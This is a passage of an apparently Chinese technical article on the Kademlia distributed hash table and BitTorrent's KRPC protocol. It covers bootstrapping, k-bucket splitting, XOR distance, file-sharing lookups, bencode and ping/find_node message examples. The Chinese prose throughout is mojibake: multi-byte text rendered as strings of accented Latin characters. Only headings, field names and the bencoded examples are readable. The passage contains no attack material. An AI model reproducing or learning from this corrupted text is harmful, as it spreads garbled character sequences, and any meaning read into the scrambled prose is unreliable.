å…¥ç½‘ç»œçš„èŠ‚ç‚¹é¦–å…ˆè¦ç»å†ä¸€ä¸ªå¼•å¯¼è¿‡ç¨‹ã€‚åœ¨å¼•å¯¼è¿‡ç¨‹ä¸­ï¼ŒèŠ‚ç‚¹éœ€è¦çŸ¥é“å…¶ä»–å·²åŠ å…¥è¯¥ç½‘ç»œçš„æŸä¸ªèŠ‚ç‚¹çš„IPåœ°å€å’Œç«¯å£å·(å¯ä»ç”¨æˆ·æˆ–è€…å­˜å‚¨çš„åˆ—è¡¨ä¸­è·å¾—)ã€‚å‡å¦‚æ­£åœ¨å¼•å¯¼çš„é‚£ä¸ªèŠ‚ç‚¹è¿˜æœªåŠ å…¥ç½‘ç»œï¼Œå®ƒä¼šè®¡ç®—ä¸€ä¸ªç›®å‰ä¸ºæ­¢è¿˜æœªåˆ†é…ç»™å…¶ä»–èŠ‚ç‚¹çš„éšæœºIDå·ï¼Œç›´åˆ°ç¦»å¼€ç½‘ç»œï¼Œè¯¥èŠ‚ç‚¹ä¼šä¸€ç›´ä½¿ç”¨è¯¥IDå· \n2. æ­£åœ¨åŠ å…¥Kademliaç½‘ç»œçš„èŠ‚ç‚¹åœ¨å®ƒçš„æŸä¸ªKæ¡¶ä¸­æ’å…¥å¼•å¯¼èŠ‚ç‚¹(åŠ å…¥è¯¥ç½‘ç»œçš„ä»‹ç»äºº)(è´Ÿè´£åŠ å…¥èŠ‚ç‚¹çš„åˆå§‹åŒ–å·¥ä½œ)ï¼Œç„¶åå‘å®ƒçš„å”¯ä¸€é‚»å±…(å¼•å¯¼èŠ‚ç‚¹)å‘èµ·NODE_LOOKUPæ“ä½œè¯·æ±‚æ¥å®šä½è‡ªå·±ï¼Œè¿™ç§\"è‡ªæˆ‘å®šä½\"å°†ä½¿å¾—Kademliaçš„å…¶ä»–èŠ‚ç‚¹(æ”¶åˆ°è¯·æ±‚çš„èŠ‚ç‚¹)èƒ½å¤Ÿä½¿ç”¨æ–°åŠ å…¥èŠ‚ç‚¹çš„Node Idå¡«å……ä»–ä»¬çš„Kæ¡¶(é‚»å±…äº’ç›¸è®¤è¯†)\n3. åŒæ—¶ä¹Ÿèƒ½å¤Ÿä½¿ç”¨é‚£äº›æŸ¥è¯¢è¿‡ç¨‹çš„ä¸­é—´èŠ‚ç‚¹(ä½äºæ–°åŠ å…¥èŠ‚ç‚¹å’Œå¼•å¯¼èŠ‚ç‚¹çš„æŸ¥è¯¢è·¯å¾„ä¸Šçš„å…¶ä»–èŠ‚ç‚¹)æ¥å¡«å……æ–°åŠ å…¥èŠ‚ç‚¹çš„Kæ¡¶(ç›¸å½“äºå®Œæˆä¸€ä¸ªDNSé€’å½’æŸ¥è¯¢åï¼Œæ²¿é€”è·¯å¾„ä¸Šçš„DNS IPéƒ½è¢«è®°å½•äº†)ã€‚æƒ³è±¡ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹\n    + æ–°åŠ å…¥çš„èŠ‚ç‚¹å¯èƒ½å’Œ\"å¼•å¯¼èŠ‚ç‚¹\"è·ç¦»å¾ˆè¿œï¼Œå®ƒä¸€ä¸Šæ¥å°±å‘ç¦»è‡ªå·±å‡ ä½•è·ç¦»æœ€è¿œçš„å¼•å¯¼èŠ‚ç‚¹é—®è¯: \"è°çŸ¥é“æˆ‘è‡ªå·±è¿™ä¸ªèŠ‚ç‚¹åœ¨å“ª?\"ï¼Œå¼•å¯¼èŠ‚ç‚¹ä¼šå°½åŠ›å»å›ç­”è¿™ä¸ªé—®é¢˜ï¼Œå³å¼•å¯¼èŠ‚ç‚¹ä¼šæŠŠè‡ªå·±Kæ¡¶å†…æœ€æœ‰å¯èƒ½çŸ¥é“è¯¥èŠ‚ç‚¹ä½ç½®(å³ç¦»è¯¥å‡ ç‚¹XORå‡ ä½•è·ç¦»æœ€è¿‘çš„Kä¸ªç‚¹è¿”å›ç»™æ–°åŠ å…¥çš„è¯·æ±‚èŠ‚ç‚¹)\n    + <font color=\"red\">æ–°åŠ å…¥çš„è¯·æ±‚æ–¹æ”¶åˆ°äº†Kä¸ªèŠ‚ç‚¹åï¼ŒæŠŠè¿™Kä¸ªèŠ‚ç‚¹ä¿å­˜è¿›è‡ªå·±çš„Kæ¡¶ï¼Œç„¶åç»§ç»­å‘è¿™äº›èŠ‚ç‚¹å»\"è¯¢é—®(å‘èµ·find_nodeè¯·æ±‚)\"è‡ªå·±çš„èŠ‚ç‚¹åœ¨å“ªï¼Œè¿™äº›èŠ‚ç‚¹ä¼šæ”¶åˆ°è¿™äº›è¯·æ±‚ï¼ŒåŒæ—¶ä¹ŸæŠŠæ–°åŠ å…¥èŠ‚ç‚¹ä¿å­˜è¿›è‡ªå·±çš„Kæ¡¶å†…</font>\n    + æ•´ä¸ªè¿‡ç¨‹å’Œå‘DNSæ ¹åŸŸåæœåŠ¡å™¨è¯·æ±‚è§£ææŸä¸ªåŸŸåçš„é€’å½’è¿‡ç¨‹ç±»ä¼¼\n4. è¿™ä¸€è‡ªæŸ¥è¯¢è¿‡ç¨‹ä½¿å¾—æ–°åŠ å…¥èŠ‚ç‚¹è‡ªå¼•å¯¼èŠ‚ç‚¹æ‰€åœ¨çš„é‚£ä¸ªKæ¡¶å¼€å§‹ï¼Œç”±è¿œåŠè¿‘ï¼Œå¯¹æ²¿é€”çš„æ‰€æœ‰èŠ‚ç‚¹é€æ­¥å¾—åˆ°åˆ·æ–°ï¼Œæ•´æ¡é“¾è·¯ä¸Šçš„é‚»å±…éƒ½è®¤è¯†äº†è¿™ä¸ªæ–°é‚»å±…\n5. æœ€åˆçš„æ—¶å€™ï¼ŒèŠ‚ç‚¹ä»…æœ‰ä¸€ä¸ªKæ¡¶(è¦†ç›–æ‰€æœ‰çš„IDèŒƒå›´)ï¼Œå½“æœ‰æ–°èŠ‚ç‚¹éœ€è¦æ’å…¥è¯¥Kæ¡¶æ—¶ï¼Œå¦‚æœKæ¡¶å·²æ»¡ï¼ŒKæ¡¶å°±å¼€å§‹åˆ†è£‚ï¼Œåˆ†è£‚å‘ç”Ÿåœ¨èŠ‚ç‚¹çš„Kæ¡¶çš„è¦†ç›–èŒƒå›´(è¡¨ç°ä¸ºäºŒå‰æ ‘æŸéƒ¨åˆ†ä»å·¦è‡³å³çš„æ‰€æœ‰å€¼)åŒ…å«äº†è¯¥èŠ‚ç‚¹æœ¬èº«çš„IDçš„æ—¶å€™ã€‚å¯¹äºèŠ‚ç‚¹å†…è·ç¦»èŠ‚ç‚¹æœ€è¿‘çš„é‚£ä¸ªKæ¡¶ï¼ŒKademliaå¯ä»¥æ”¾æ¾é™åˆ¶(å³å¯ä»¥åˆ°è¾¾Kæ—¶ä¸å‘ç”Ÿåˆ†è£‚)ï¼Œå› ä¸ºæ¡¶å†…çš„æ‰€æœ‰èŠ‚ç‚¹ç¦»è¯¥èŠ‚ç‚¹è·ç¦»æœ€è¿‘ï¼Œè¿™äº›èŠ‚ç‚¹ä¸ªæ•°å¾ˆå¯èƒ½è¶…è¿‡Kä¸ªï¼Œè€Œä¸”èŠ‚ç‚¹å¸Œæœ›çŸ¥é“æ‰€æœ‰çš„è¿™äº›æœ€è¿‘çš„èŠ‚ç‚¹ã€‚å› æ­¤ï¼Œåœ¨è·¯ç”±æ ‘ä¸­ï¼Œè¯¥èŠ‚ç‚¹é™„è¿‘å¾ˆå¯èƒ½å‡ºç°é«˜åº¦ä¸å¹³è¡¡çš„äºŒå‰å­æ ‘ã€‚å‡å¦‚Kæ˜¯20ï¼Œæ–°åŠ å…¥ç½‘ç»œçš„èŠ‚ç‚¹IDä¸º\"xxx000011001\"ï¼Œåˆ™å‰ç¼€ä¸º\"xxx0011...\"çš„èŠ‚ç‚¹å¯èƒ½æœ‰21ä¸ªï¼Œç”šè‡³æ›´å¤šï¼Œæ–°çš„èŠ‚ç‚¹å¯èƒ½åŒ…å«å¤šä¸ªå«æœ‰21ä¸ªä»¥ä¸ŠèŠ‚ç‚¹çš„Kæ¡¶(ä½äºèŠ‚ç‚¹é™„è¿‘çš„kæ¡¶)ã€‚è¿™ç‚¹ä¿è¯ä½¿å¾—è¯¥èŠ‚ç‚¹èƒ½å¤Ÿæ„ŸçŸ¥ç½‘ç»œä¸­é™„è¿‘åŒºåŸŸçš„æ‰€æœ‰èŠ‚ç‚¹\n\n\n### 0x8: æŸ¥è¯¢åŠ é€Ÿ\n\n\n1. Kademliaä½¿ç”¨å¼‚æˆ–æ¥å®šä¹‰è·ç¦»ã€‚ä¸¤ä¸ªèŠ‚ç‚¹IDçš„å¼‚æˆ–(æˆ–è€…èŠ‚ç‚¹IDå’Œå…³é”®å­—çš„å¼‚æˆ–)çš„ç»“æœå°±æ˜¯ä¸¤è€…ä¹‹é—´çš„è·ç¦»ã€‚å¯¹äºæ¯ä¸€ä¸ªäºŒè¿›åˆ¶ä½æ¥è¯´ï¼Œå¦‚æœç›¸åŒï¼Œå¼‚æˆ–è¿”å›0ï¼Œå¦åˆ™ï¼Œå¼‚æˆ–è¿”å›1ã€‚å¼‚æˆ–è·ç¦»æ»¡è¶³ä¸‰è§’å½¢ä¸ç­‰å¼: ä»»ä½•ä¸€è¾¹çš„è·ç¦»å°äº(æˆ–ç­‰äº)å…¶å®ƒä¸¤è¾¹è·ç¦»ä¹‹å’Œ\n2. å¼‚æˆ–è·ç¦»ä½¿å¾—Kademliaçš„è·¯ç”±è¡¨å¯ä»¥å»ºåœ¨å•ä¸ªbitä¹‹ä¸Šï¼Œå³å¯ä½¿ç”¨ä½ç»„(å¤šä¸ªä½è”åˆ)æ¥æ„å»ºè·¯ç”±è¡¨ã€‚ä½ç»„å¯ä»¥ç”¨æ¥è¡¨ç¤ºç›¸åº”çš„Kæ¡¶ï¼Œå®ƒæœ‰ä¸ªä¸“ä¸šæœ¯è¯­å«åšå‰ç¼€ï¼Œå¯¹ä¸€ä¸ªmä½çš„å‰ç¼€æ¥è¯´ï¼Œå¯å¯¹åº”2^m-1ä¸ªKæ¡¶(mä½çš„å‰ç¼€æœ¬æ¥å¯ä»¥å¯¹åº”2^mä¸ªKæ¡¶)å¦å¤–çš„é‚£ä¸ªKæ¡¶å¯ä»¥è¿›ä¸€æ­¥æ‰©å±•ä¸ºåŒ…å«è¯¥èŠ‚ç‚¹æœ¬èº«IDçš„è·¯ç”±æ ‘\n3. ä¸€ä¸ªbä½çš„å‰ç¼€å¯ä»¥æŠŠæŸ¥è¯¢çš„æœ€å¤§æ¬¡æ•°ä»lognå‡å°‘åˆ°logn/bã€‚è¿™åªæ˜¯æŸ¥è¯¢æ¬¡æ•°çš„æœ€å¤§å€¼ï¼Œå› ä¸ºè‡ªå·±Kæ¡¶å¯èƒ½æ¯”å‰ç¼€æœ‰æ›´å¤šçš„ä½ä¸ç›®æ ‡é”®ç›¸åŒï¼Œè¿™ä¼šå¢åŠ åœ¨è‡ªå·±Kæ¡¶ä¸­æ‰¾åˆ°èŠ‚ç‚¹çš„æœºä¼šï¼Œå‡è®¾å‰ç¼€æœ‰mä½ï¼Œå¾ˆå¯èƒ½æŸ¥è¯¢ä¸€ä¸ªèŠ‚ç‚¹å°±èƒ½åŒ¹é…2mç”šè‡³æ›´å¤šçš„ä½ç»„ï¼Œæ‰€ä»¥å…¶å®å¹³å‡çš„æŸ¥è¯¢æ¬¡æ•°è¦å°‘çš„å¤š \n4. èŠ‚ç‚¹å¯ä»¥åœ¨ä»–ä»¬çš„è·¯ç”±è¡¨ä¸­ä½¿ç”¨æ··åˆå‰ç¼€ï¼Œå°±åƒeMuleä¸­çš„Kadç½‘ç»œã€‚å¦‚æœä»¥å¢åŠ æŸ¥è¯¢çš„å¤æ‚æ€§ä¸ºä»£ä»·ï¼ŒKademliaç½‘ç»œåœ¨è·¯ç”±è¡¨çš„å…·ä½“å®ç°ä¸Šç”šè‡³å¯ä»¥æ˜¯æœ‰å¼‚æ„çš„\n\n\n### 0x9: åœ¨æ–‡ä»¶åˆ†äº«ç½‘ç»œä¸­çš„åº”ç”¨\n\nKademliaå¯åœ¨æ–‡ä»¶åˆ†äº«ç½‘ç»œä¸­ä½¿ç”¨ï¼Œé€šè¿‡åˆ¶ä½œKademliaå…³é”®å­—æœç´¢ï¼Œæˆ‘ä»¬èƒ½å¤Ÿåœ¨æ–‡ä»¶åˆ†äº«ç½‘ç»œä¸­æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„æ–‡ä»¶ä»¥ä¾›æˆ‘ä»¬ä¸‹è½½ã€‚ç”±äºæ²¡æœ‰ä¸­å¤®æœåŠ¡å™¨å­˜å‚¨æ–‡ä»¶çš„ç´¢å¼•ï¼Œè¿™éƒ¨åˆ†å·¥ä½œå°±è¢«å¹³å‡åœ°åˆ†é…åˆ°æ‰€æœ‰çš„å®¢æˆ·ç«¯ä¸­å»\n\n\n\n1. å‡å¦‚ä¸€ä¸ªèŠ‚ç‚¹å¸Œæœ›åˆ†äº«æŸä¸ªæ–‡ä»¶ï¼Œå®ƒå…ˆæ ¹æ®æ–‡ä»¶çš„å†…å®¹æ¥å¤„ç†è¯¥æ–‡ä»¶ï¼Œé€šè¿‡è¿ç®—ï¼ŒæŠŠæ–‡ä»¶çš„å†…å®¹æ•£åˆ—æˆä¸€ç»„æ•°å­—ï¼Œè¯¥æ•°å­—åœ¨æ–‡ä»¶åˆ†äº«ç½‘ç»œä¸­å¯è¢«ç”¨æ¥æ ‡è¯†æ–‡ä»¶\n2. <font color=\"red\">è¿™ç»„æ•£åˆ—æ•°å­—å¿…é¡»å’ŒèŠ‚ç‚¹IDæœ‰åŒæ ·çš„é•¿åº¦ï¼Œç„¶åï¼Œè¯¥èŠ‚ç‚¹ä¾¿åœ¨ç½‘ç»œä¸­æœç´¢IDå€¼ä¸æ–‡ä»¶çš„æ•£åˆ—å€¼ç›¸è¿‘çš„èŠ‚ç‚¹ï¼Œç„¶åå‘è¿™äº›è¢«æœç´¢åˆ°çš„èŠ‚ç‚¹å¹¿æ’­è‡ªå·±(å³æŠŠå®ƒè‡ªå·±çš„IPåœ°å€å­˜å‚¨åœ¨é‚£äº›æœç´¢åˆ°çš„èŠ‚ç‚¹ä¸Š)ï¼Œæœ¬è´¨æ„æ€æ˜¯è¯´: \"ä½ å¦‚æœè¦æœç´¢è¿™ä¸ªæ–‡ä»¶ï¼Œå°±å»æ‰¾é‚£äº›èŠ‚ç‚¹IDå°±å¥½äº†ï¼Œé‚£äº›èŠ‚ç‚¹IDä¼šå‘Šè¯‰æœç´¢è€…åº”è¯¥åˆ°è‡ªå·±è¿™é‡Œæ¥(æ–‡ä»¶å‘å¸ƒè€…)æ¥å»ºç«‹TCPè¿æ¥ï¼Œä¸‹è½½æ–‡ä»¶\"ï¼Œ</font><font color=\"blue\">ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒæŠŠè‡ªå·±ä½œä¸ºæ–‡ä»¶çš„æºè¿›è¡Œäº†å‘å¸ƒ(æ–‡ä»¶å…±äº«æ–¹å¼)ã€‚æ­£åœ¨è¿›è¡Œæ–‡ä»¶æœç´¢çš„å®¢æˆ·ç«¯å°†ä½¿ç”¨Kademliaåè®®æ¥å¯»æ‰¾ç½‘ç»œä¸ŠIDå€¼ä¸å¸Œæœ›å¯»æ‰¾çš„æ–‡ä»¶çš„æ•£åˆ—å€¼æœ€è¿‘çš„é‚£ä¸ªèŠ‚ç‚¹(å¯»æ‰¾æ–‡ä»¶çš„è¿‡ç¨‹å’Œå¯»æ‰¾èŠ‚ç‚¹çš„æœºåˆ¶å½¢æˆäº†ç»Ÿä¸€ï¼Œå› ä¸ºæ–‡ä»¶å’ŒèŠ‚ç‚¹çš„IDçš„HASHæ ¼å¼æ˜¯ä¸€æ ·çš„)ï¼Œç„¶åå–å¾—å­˜å‚¨åœ¨é‚£ä¸ªèŠ‚ç‚¹ä¸Šçš„æ–‡ä»¶æºåˆ—è¡¨</font> \n3. ç”±äºä¸€ä¸ªé”®(HASH)å¯ä»¥å¯¹åº”å¾ˆå¤šå€¼ï¼Œå³åŒä¸€ä¸ªæ–‡ä»¶(é€šè¿‡ä¸€ä¸ªå¯¹åº”çš„HASHå…¬å¸ƒåˆ°P2Pç½‘ç»œä¸­)å¯ä»¥æœ‰å¤šä¸ªæº(å› ä¸ºå¯èƒ½æœ‰å¤šä¸ªèŠ‚ç‚¹éƒ½ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶çš„æ‹·è´)ï¼Œæ¯ä¸€ä¸ªå­˜å‚¨æºåˆ—è¡¨çš„èŠ‚ç‚¹å¯èƒ½æœ‰ä¸åŒçš„æ–‡ä»¶çš„æºçš„ä¿¡æ¯ï¼Œè¿™æ ·çš„è¯ï¼Œæºåˆ—è¡¨å¯ä»¥ä»ä¸é”®å€¼ç›¸è¿‘çš„Kä¸ªèŠ‚ç‚¹è·å¾—ã€‚ æ–‡ä»¶çš„æ•£åˆ—å€¼é€šå¸¸å¯ä»¥ä»å…¶ä»–çš„ä¸€äº›ç‰¹åˆ«çš„Interneté“¾æ¥çš„åœ°æ–¹è·å¾—ï¼Œæˆ–è€…è¢«åŒ…å«åœ¨ä»å…¶ä»–æŸå¤„è·å¾—çš„ç´¢å¼•æ–‡ä»¶ä¸­(å³ç§å­æ–‡ä»¶)\n4. æ–‡ä»¶åçš„æœç´¢å¯ä»¥ä½¿ç”¨å…³é”®è¯æ¥å®ç°ï¼Œæ–‡ä»¶åå¯ä»¥åˆ†å‰²æˆè¿ç»­çš„å‡ ä¸ªå…³é”®è¯ï¼Œè¿™äº›å…³é”®è¯éƒ½å¯ä»¥æ•£åˆ—å¹¶ä¸”å¯ä»¥å’Œç›¸åº”çš„æ–‡ä»¶åå’Œæ–‡ä»¶æ•£åˆ—å‚¨å­˜åœ¨ç½‘ç»œä¸­ã€‚æœç´¢è€…å¯ä»¥ä½¿ç”¨å…¶ä¸­çš„æŸä¸ªå…³é”®è¯ï¼Œè”ç³»IDå€¼ä¸å…³é”®è¯æ•£åˆ—æœ€è¿‘çš„é‚£ä¸ªèŠ‚ç‚¹ï¼Œå–å¾—åŒ…å«è¯¥å…³é”®è¯çš„æ–‡ä»¶åˆ—è¡¨ã€‚ç”±äºåœ¨æ–‡ä»¶åˆ—è¡¨ä¸­çš„æ–‡ä»¶éƒ½æœ‰ç›¸å…³çš„æ•£åˆ—å€¼ï¼Œé€šè¿‡è¯¥æ•£åˆ—å€¼å°±å¯åˆ©ç”¨ä¸Šè¿°é€šå¸¸å–æ–‡ä»¶çš„æ–¹æ³•è·å¾—è¦æœç´¢çš„æ–‡ä»¶\n\n\n# 2. KRPC åè®® KRPC Protocol\n\nKRPCæ˜¯BitTorrentåœ¨Kademliaç†è®ºåŸºç¡€ä¹‹ä¸Šå®šä¹‰çš„ä¸€ä¸ªé€šä¿¡æ¶ˆæ¯æ ¼å¼åè®®ï¼Œä¸»è¦ç”¨æ¥æ”¯æŒpeerèŠ‚ç‚¹çš„è·å–(get_peer)å’ŒpeerèŠ‚ç‚¹çš„å£°æ˜(announce_peer)ï¼Œä»¥åŠåˆ¤æ´»å¿ƒè·³(ping)ã€èŠ‚ç‚¹å¯»å€(find_node)ï¼Œå®ƒåœ¨find_nodeçš„åŸç†ä¸Šå’ŒDHTæ˜¯ä¸€æ ·çš„ï¼ŒåŒæ—¶å¢åŠ äº†get_peer/announce_peer/pingåè®®çš„æ”¯æŒ\n\nKRPCåè®®æ˜¯ç”±Bç¼–ç ç»„æˆçš„ä¸€ä¸ªç®€å•çš„RPCç»“æ„ï¼Œæœ‰4ç§è¯·æ±‚ï¼špingã€find_nodeã€get_peers å’Œ announce_peer\n\n\n### 0x0: bencodeç¼–ç \n\nbencode æœ‰ 4 ç§æ•°æ®ç±»å‹: string, integer, list å’Œ dictionary\n\n```\n1. string: å­—ç¬¦æ˜¯ä»¥è¿™ç§æ–¹å¼ç¼–ç çš„: <å­—ç¬¦ä¸²é•¿åº¦>:<å­—ç¬¦ä¸²> \nå¦‚ hell: 4:hell\n\n2. integer: æ•´æ•°æ˜¯ä¸€è¿™ç§æ–¹å¼ç¼–ç çš„: i<æ•´æ•°>e \nå¦‚ 1999: i1999e\n\n3. list: åˆ—è¡¨æ˜¯ä¸€è¿™ç§æ–¹å¼ç¼–ç çš„: l[æ•°æ®1][æ•°æ®2][æ•°æ®3][â€¦]e \nå¦‚åˆ—è¡¨ [hello, world, 101]ï¼šl5:hello5:worldi101ee\n\n4. dictionary: å­—å…¸æ˜¯ä¸€è¿™ç§æ–¹å¼ç¼–ç çš„: d[key1][value1][key2][value2][â€¦]eï¼Œå…¶ä¸­ key å¿…é¡»æ˜¯ string è€Œä¸”æŒ‰ç…§å­—æ¯é¡ºåºæ’åº \nå¦‚å­—å…¸ {aa:100, bb:bb, cc:200}ï¼š d2:aai100e2:bb2:bb2:cci200ee\n```\n\nKRPC åè®®æ˜¯ç”± bencode ç¼–ç ç»„æˆçš„ä¸€ä¸ªç®€å•çš„ RPC ç»“æ„ï¼Œä»–ä½¿ç”¨ UDP æŠ¥æ–‡å‘é€ã€‚ä¸€ä¸ªç‹¬ç«‹çš„è¯·æ±‚åŒ…è¢«å‘å‡ºå»ç„¶åä¸€ä¸ªç‹¬ç«‹çš„åŒ…è¢«å›å¤ã€‚è¿™ä¸ªåè®®æ²¡æœ‰é‡å‘(UDPæ˜¯æ— è¿æ¥åè®®)\n\n\n### 0x1: KRPCå­—å…¸åŸºæœ¬ç»„æˆå…ƒç´ \n\nä¸€æ¡ KRPC æ¶ˆæ¯å³å¯èƒ½æ˜¯requestï¼Œä¹Ÿå¯èƒ½æ˜¯responseï¼Œç”±ä¸€ä¸ªç‹¬ç«‹çš„å­—å…¸ç»„æˆ\n\n```\n1. tå…³é”®å­—: æ¯æ¡æ¶ˆæ¯éƒ½åŒ…å« t å…³é”®å­—ï¼Œå®ƒæ˜¯ä¸€ä¸ªä»£è¡¨äº† transaction ID çš„å­—ç¬¦ä¸²ã€‚transaction ID ç”±è¯·æ±‚èŠ‚ç‚¹äº§ç”Ÿï¼Œå¹¶ä¸”å›å¤ä¸­è¦åŒ…å«å›æ˜¾è¯¥å­—æ®µ(æŒ‘æˆ˜-å“åº”æ¨¡å‹)ï¼Œæ‰€ä»¥å›å¤å¯èƒ½å¯¹åº”ä¸€ä¸ªèŠ‚ç‚¹çš„å¤šä¸ªè¯·æ±‚ã€‚transaction ID åº”å½“è¢«ç¼–ç ä¸ºä¸€ä¸ªçŸ­çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚ 2 ä¸ªå­—èŠ‚ï¼Œè¿™æ ·å°±å¯ä»¥å¯¹åº” 2^16 ä¸ªè¯·æ±‚\n2. yå…³é”®å­—: å®ƒç”±ä¸€ä¸ªå­—èŠ‚ç»„æˆï¼Œè¡¨æ˜è¿™ä¸ªæ¶ˆæ¯çš„ç±»å‹ã€‚y å¯¹åº”çš„å€¼æœ‰ä¸‰ç§æƒ…å†µ\n    1) q è¡¨ç¤ºè¯·æ±‚(è¯·æ±‚Queries): qç±»å‹çš„æ¶ˆæ¯å®ƒåŒ…å« 2 ä¸ªé™„åŠ çš„å…³é”®å­— q å’Œ a\n        1.1) å…³é”®å­— q: æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼ŒåŒ…å«äº†è¯·æ±‚çš„æ–¹æ³•åå­—(get_peers/announce_peer/ping/find_node)\n        1.2) å…³é”®å­— a: ä¸€ä¸ªå­—å…¸ç±»å‹åŒ…å«äº†è¯·æ±‚æ‰€é™„åŠ çš„å‚æ•°(info_hash/id..)\n    2) r è¡¨ç¤ºå›å¤(å›å¤ Responses): åŒ…å«äº†è¿”å›çš„å€¼ã€‚å‘é€å›å¤æ¶ˆæ¯æ˜¯åœ¨æ­£ç¡®è§£æäº†è¯·æ±‚æ¶ˆæ¯çš„åŸºç¡€ä¸Šå®Œæˆçš„ï¼ŒåŒ…å«äº†ä¸€ä¸ªé™„åŠ çš„å…³é”®å­— rã€‚å…³é”®å­— r æ˜¯å­—å…¸ç±»å‹\n        2.1) id: peerèŠ‚ç‚¹idå·æˆ–è€…ä¸‹ä¸€è·³DHTèŠ‚ç‚¹\n                2.2) nodes\": \"\" \n                2.3) token: token\n    3) e è¡¨ç¤ºé”™è¯¯(é”™è¯¯ Errors): åŒ…å«ä¸€ä¸ªé™„åŠ çš„å…³é”®å­— eï¼Œå…³é”®å­— e æ˜¯åˆ—è¡¨ç±»å‹\n        3.1) ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯æ•°å­—ç±»å‹ï¼Œè¡¨æ˜äº†é”™è¯¯ç ï¼Œå½“ä¸€ä¸ªè¯·æ±‚ä¸èƒ½è§£ææˆ–å‡ºé”™æ—¶ï¼Œé”™è¯¯åŒ…å°†è¢«å‘é€ã€‚ä¸‹è¡¨æè¿°äº†å¯èƒ½å‡ºç°çš„é”™è¯¯ç \n        201: ä¸€èˆ¬é”™è¯¯\n        202: æœåŠ¡é”™è¯¯\n        203: åè®®é”™è¯¯ï¼Œæ¯”å¦‚ä¸è§„èŒƒçš„åŒ…ï¼Œæ— æ•ˆçš„å‚æ•°ï¼Œæˆ–è€…é”™è¯¯çš„ toke\n        204: æœªçŸ¥æ–¹æ³• \n        3.2) ç¬¬äºŒä¸ªå…ƒç´ æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œè¡¨æ˜äº†é”™è¯¯ä¿¡æ¯\n```\n\nä»¥ä¸Šæ˜¯æ•´ä¸ªKRPCçš„åè®®æ¡†æ¶ç»“æ„ï¼Œå…·ä½“åˆ°è¯·æ±‚Query/å›å¤Response/é”™è¯¯Errorè¿˜æœ‰å…·ä½“çš„åè®®å®ç°\n\n\n### 0x2: è¯·æ±‚Queryå…·ä½“åè®®\n\næ‰€æœ‰çš„è¯·æ±‚éƒ½åŒ…å«ä¸€ä¸ªå…³é”®å­— idï¼Œå®ƒåŒ…å«äº†è¯·æ±‚èŠ‚ç‚¹çš„èŠ‚ç‚¹ IDã€‚æ‰€æœ‰çš„å›å¤ä¹ŸåŒ…å«å…³é”®å­—idï¼Œå®ƒåŒ…å«äº†å›å¤èŠ‚ç‚¹çš„èŠ‚ç‚¹ ID\n\n\n+ <font color=\"red\"> ping: æ£€æµ‹èŠ‚ç‚¹æ˜¯å¦å¯è¾¾ï¼Œè¯·æ±‚åŒ…å«ä¸€ä¸ªå‚æ•°idï¼Œä»£è¡¨è¯¥èŠ‚ç‚¹çš„nodeIDã€‚å¯¹åº”çš„å›å¤ä¹Ÿåº”è¯¥åŒ…å«å›å¤è€…çš„nodeID </font>\n\n```\nping Query = {\"t\":\"aa\", \"y\":\"q\", \"q\":\"ping\", \"a\":{\"id\":\"abcdefghij0123456789\"}}\nbencoded = d1:ad2:id20:abcdefghij0123456789e1:q4:ping1:t2:aa1:y1:qe\n\t\nResponse = {\"t\":\"aa\", \"y\":\"r\", \"r\": {\"id\":\"mnopqrstuvwxyz123456\"}}\nbencoded = d1:rd2:id20:mnopqrstuvwxyz123456e1:t2:aa1:y1:re\n```\n\n+ <font color=\"red\"> find_node: find_node è¢«ç”¨æ¥æŸ¥æ‰¾ç»™å®š ID çš„DHTèŠ‚ç‚¹çš„è”ç³»ä¿¡æ¯ï¼Œè¯¥è¯·æ±‚åŒ…å«ä¸¤ä¸ªå‚æ•°id(ä»£è¡¨è¯¥èŠ‚ç‚¹çš„nodeID)å’Œtargetã€‚å›å¤ä¸­åº”è¯¥åŒ…å«è¢«è¯·æ±‚èŠ‚ç‚¹çš„è·¯ç”±è¡¨ä¸­è·ç¦»targetæœ€æ¥è¿‘çš„Kä¸ªnodeIDä»¥åŠå¯¹åº”çš„nodeINFO</font>\n\t\n```\nfind_node Query = {\"t\":\"aa\", \"y\":\"q\", \"q\":\"find_node\", \"a\": {\"id\":\"abcdefghij0123456789\", \"target\":\"mnopqrstuvwxyz123456\"}}\n# \"id\" containing the node ID of the querying node, and \"target\" containing the ID of the node sought by the queryer. \nbencoded = d1:ad2:id20:abcdefghij01234567896:target20:mnopqrstuvwxyz123456e1:q9:find_node1:t2:aa1:y1:qe\n\t\nResponse = {\"t\":\"aa\", \"y\":\"r\", \"r\": {\"id\":\"0123456789abcdefghij\", \"nodes\": \"def456...\"}}\nbencoded = d1:rd2:id20:0123456789abcdefghij5:nodes9:def456...e1:t2:aa1:y1:re\n```\n\nfind_node è¯·æ±‚åŒ…å« 2 ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ idï¼ŒåŒ…å«äº†è¯·æ±‚èŠ‚ç‚¹çš„IDã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯ targetï¼ŒåŒ…å«äº†è¯·æ±‚è€…æ­£åœ¨æŸ¥æ‰¾çš„èŠ‚ç‚¹çš„ID\n\t\nå½“ä¸€ä¸ªèŠ‚ç‚¹æ¥æ”¶åˆ°äº† find_node çš„è¯·æ±‚ï¼Œä»–åº”è¯¥ç»™å‡ºå¯¹åº”çš„å›å¤ï¼Œå›å¤ä¸­åŒ…å« 2 ä¸ªå…³é”®å­— id(è¢«è¯·æ±‚èŠ‚ç‚¹çš„id) å’Œ nodesï¼Œnodes æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼ŒåŒ…å«äº†è¢«è¯·æ±‚èŠ‚ç‚¹çš„è·¯ç”±è¡¨ä¸­æœ€æ¥è¿‘ç›®æ ‡èŠ‚ç‚¹çš„ K(8) ä¸ªæœ€æ¥è¿‘çš„èŠ‚ç‚¹çš„è”ç³»ä¿¡æ¯(è¢«è¯·æ±‚æ–¹æ¯æ¬¡éƒ½ç»Ÿä¸€è¿”å›æœ€é è¿‘ç›®æ 